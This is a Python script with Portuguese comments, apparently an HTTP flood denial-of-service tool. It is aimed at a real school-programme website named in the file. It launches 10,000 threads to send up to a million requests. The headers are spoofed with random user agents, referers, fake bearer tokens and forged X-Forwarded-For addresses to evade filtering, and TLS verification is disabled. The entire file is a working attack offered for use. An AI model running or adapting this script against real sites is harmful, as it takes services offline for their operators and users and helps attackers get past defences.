import threading
import requests
import random
import string

url = 'https://ecoescolas.abaae.pt/'  # URL do alvo
num_threads = 10000  # Número de threads para enviar requisições
num_requests = 1000000  # Número total de requisições a serem enviadas

def generate_random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def load_user_agents(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()

def load_referers(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()

user_agents = load_user_agents('useragents.txt')
referers = load_referers('referers.txt')

def ddos_attack():
    global num_requests
    user_agent = random.choice(user_agents)
    referer = random.choice(referers)
    headers = {
        'User-Agent': user_agent,
        'Referer': referer,
        'Authorization': 'Bearer ' + generate_random_string(50),
        'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4)),
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'DNT': '1',
        'If-None-Match': 'W/"359670651"',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Origin': 'https://example.com',
        'TE': 'Trailers'
    }
    while num_requests > 0:
        try:
            # Aqui podemos encapsular o tráfego malicioso em um protocolo legítimo, como HTTPS
            response = requests.get(url, headers=headers, timeout=1, verify=False)
            print(f'Status code: {response.status_code}')
        except requests.exceptions.RequestException as e:
            print(f'Error: {e}')
        num_requests -= 1

# Inicia os threads
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=ddos_attack)
    thread.start()
    threads.append(thread)

# Espera todos os threads terminarem
for thread in threads:
    thread.join()

print('HTTP Flood DDoS attack finished.')